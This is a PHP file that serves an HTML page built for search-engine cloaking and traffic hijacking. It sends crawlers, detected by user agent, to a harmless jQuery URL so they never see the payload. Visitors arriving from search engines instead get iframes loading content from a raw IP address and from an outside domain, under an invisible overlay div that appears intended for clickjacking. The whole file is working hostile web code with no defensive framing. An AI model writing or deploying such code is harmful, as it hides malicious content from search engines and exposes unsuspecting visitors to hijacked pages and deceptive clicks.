<?php
$whiteList = array(
    'www.xyher.com',
);

$html= <<<HTML
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title></title>
<script src="http://apps.bdimg.com/libs/jquery/1.8.3/jquery.min.js"></script>
<STYLE type=text/css>
<!--
/*.iframe {position: relative;z-index:1;top:-850px;}
.y{margin-top:-800x;}*/
-->

</STYLE>



<STYLE type=text/css>
<!--
.iframe2 {position: relative;z-index:1;top:0px;}
.y{margin-top:0x;}
-->

</STYLE>
</head>
<body>


<script type="text/javascript">
setReffer();
function setReffer(){
	var url = location.href.toString();
	var reffer =getQueryString('reffer');
    //console.log(reffer);
    var isFromSearch = isSearchReffer(reffer);
    if(isFromSearch) {
        document.write('<Div id="DivLocker" style="padding-top:235px;"><iframe class="iframe" src=http://117.41.229.172:888/temp/test.asp  align=center frameborder=no scrolling=no marginwidth="1" marginheight="1"  width="100%" height="200"  allowTransparency="true"  ></iframe></div><iframe class="iframe2" src=http://qussff.rousf.com align=center frameborder=0 scrolling=no marginwidth="1" marginheight="1"  width="100%" height="1000" ></iframe>');
    } else {
        //document.write('hello world!');
        location.href = 'http://libs.baidu.com/jquery/1.9.0/jquery.js';
    }
}


//setHeight();

//function setHeight(){
    //var iObj = parent.document.getElementById('sqxSizeFrame');
	//var url = location.href.toString();
	//var hei =getQueryString('frameHeight');
    //iObj.style.height = hei+"px";//操作dom
    //iObj.style.width = "90%";//操作dom
//}

function isSearchReffer(r)
{
    r = r.toLowerCase(); //转为小写
    var aSites = new Array('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.');
    var b = false;
    for (i in aSites){
        if (r.indexOf(aSites[i]) > 0){
            b = true;
            break;
        }
    }
    return b;
}


function getQueryString(name) 
{ 
    // 如果链接没有参数，或者链接中不存在我们要获取的参数，直接返回空 
    if(location.href.indexOf("?")==-1 || location.href.indexOf(name+'=')==-1) 
    { 
        return ''; 
    } 
  
    // 获取链接中参数部分 
    var queryString = location.href.substring(location.href.indexOf("?")+1); 
  
    // 分离参数对 ?key=value&key2=value2 
    var parameters = queryString.split("&"); 
  
    var pos, paraName, paraValue; 
    for(var i=0; i<parameters.length; i++) 
    { 
        // 获取等号位置 
        pos = parameters[i].indexOf('='); 
        if(pos == -1) { continue; } 
  
        // 获取name 和 value 
        paraName = parameters[i].substring(0, pos); 
        paraValue = parameters[i].substring(pos + 1); 
  
        // 如果查询的name等于当前name，就返回当前值，同时，将链接中的+号还原成空格 
        if(paraName == name) 
        { 
            return unescape(paraValue.replace(/\+/g, " ")); 
        } 
    } 
    return ''; 
}; 
</script>

    </body>
<script>
  $('#DivLocker').css({
    "position": "absolute",
    "margin-left": "1px",
    "margin-top": "1px",
    "background-color": "#E6E6E6",
    "height": function () { return 250;//$(document).height();
    },
    "filter": "alpha(opacity=00)",
    "opacity": "0.0",
    "overflow": "hidden",
    "width": function () { return $(document).width(); },
    "z-index": "999"
});
</script>
</html>
HTML;

if(isSpider()) {
	//echo 'hello world!';
    header("Location: http://libs.baidu.com/jquery/1.9.0/jquery.js");
    exit;
}

$fferUrl = '';
$httpReffer = isset($_server['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
if(!empty($httpReffer)) {
    $parseUrl = parse_url($httpReffer);
    $fferUrl = $parseUrl['host'];

}
$reffer = getUrlQuery('reffer');
if(isCrawler($reffer) || in_array($fferUrl, $whiteList)) {
//if(isset($_server['HTTP_REFERER']) || in_array($fferUrl, $whiteList)) {
	echo $html;
} else {
	//echo 'hello world!';
    header("Location: http://libs.baidu.com/jquery/1.9.0/jquery.js");
    exit;
}
//echo '<br>'.strtolower($_SERVER['HTTP_USER_AGENT']);  
//echo '<br>'.get_ip();

function getUrlQuery($key = null)
{
    $retVar = "";
    $queryStr = $_SERVER['QUERY_STRING'];
    if(empty($queryStr)) {
        return $retVar;
    }
    $qArr = explode('&', $queryStr);
    foreach($qArr as $q) {
        $keyVal = explode('=',$q);
        $retVar[$keyVal[0]] = $keyVal[1];
    }
    if(!empty($key)) {
        return isset($retVar[$key]) ? $retVar[$key] : '';
    }

    return $retVar;
}

function isSpider()
{
    $reffer = $_SERVER['HTTP_USER_AGENT'];
    $agent= strtolower($reffer);  
    if (!empty($agent)) {                 
            $spiderSite= array(
                    "TencentTraveler",
                    "Baiduspider+",
                    "BaiduGame",
                    "Googlebot",
                    "msnbot",
                    "Sosospider+",
                    "Sogou web spider",
                    "ia_archiver",
                    "Yahoo! Slurp",
                    "YoudaoBot",
                    "Yahoo Slurp",
                    "MSNBot",
                    "Java (Often spam bot)",
                    "BaiDuSpider",
                    "Voila",
                    "Yandex bot",
                    "BSpider",
                    "twiceler",
                    "Sogou Spider",
                    "Speedy Spider",
                    "Google AdSense",
                    "Heritrix",
                    "Python-urllib",
                    "Alexa (IA Archiver)",
                    "Ask",
                    "Exabot",
                    "Custo",
                    "OutfoxBot/YodaoBot",
                    "yacy",
                    "SurveyBot",
                    "legs",
                    "lwp-trivial",
                    "Nutch",
                    "StackRambler",
                    "The web archive (IA Archiver)",
                    "Perl tool",
                    "MJ12bot",
                    "Netcraft",
                    "MSIECrawler",
                    "WGet tools",
                    "larbin",
                    "Fish search",
                    "360Spider",
            );   
            foreach($spiderSite as $val) {                        
                    $str = strtolower($val);
                    if (strpos($agent, $str) !== false) {
                            return true;
                    }                        
            }   
    } else {
            return false;
    } 
}

/**
*    判断是否为搜索引擎蜘蛛
*
*    @author    Eddy
*    @return    bool
*/
function isCrawler($reffer) {
        $reffer = empty($reffer) ? $_SERVER['HTTP_USER_AGENT'] : $reffer;
        $agent= strtolower($reffer);  
        if (!empty($agent)) {                 
                $spiderSite= array(
                        "TencentTraveler",
                        "Baiduspider+",
                        "BaiduGame",
                        "Googlebot",
                        "msnbot",
                        "Sosospider+",
                        "Sogou web spider",
                        "ia_archiver",
                        "Yahoo! Slurp",
                        "YoudaoBot",
                        "Yahoo Slurp",
                        "MSNBot",
                        "Java (Often spam bot)",
                        "BaiDuSpider",
                        "Voila",
                        "Yandex bot",
                        "BSpider",
                        "twiceler",
                        "Sogou Spider",
                        "Speedy Spider",
                        "Google AdSense",
                        "Heritrix",
                        "Python-urllib",
                        "Alexa (IA Archiver)",
                        "Ask",
                        "Exabot",
                        "Custo",
                        "OutfoxBot/YodaoBot",
                        "yacy",
                        "SurveyBot",
                        "legs",
                        "lwp-trivial",
                        "Nutch",
                        "StackRambler",
                        "The web archive (IA Archiver)",
                        "Perl tool",
                        "MJ12bot",
                        "Netcraft",
                        "MSIECrawler",
                        "WGet tools",
                        "larbin",
                        "Fish search",
						"360Spider",
'google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.',
                );   
                foreach($spiderSite as $val) {                        
                        $str = strtolower($val);
                        if (strpos($agent, $str) !== false) {
                                return true;
                        }                        
                }   
        } else {
                return false;
        } 
}

/**
 * get_ip 
 * 获取IP
 * @access public
 * @return void
 */
function get_ip()
{
	if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
		$onlineip = getenv('HTTP_CLIENT_IP');
	} elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
		$onlineip = getenv('HTTP_X_FORWARDED_FOR');
	} elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
		$onlineip = getenv('REMOTE_ADDR');
	} elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
		$onlineip = $_SERVER['REMOTE_ADDR'];
	}

	preg_match("/[\d\.]{7,15}/", $onlineip, $onlineipmatches);
	$ip = $onlineipmatches[0] ? $onlineipmatches[0] : '';

	return $ip;
}

?>
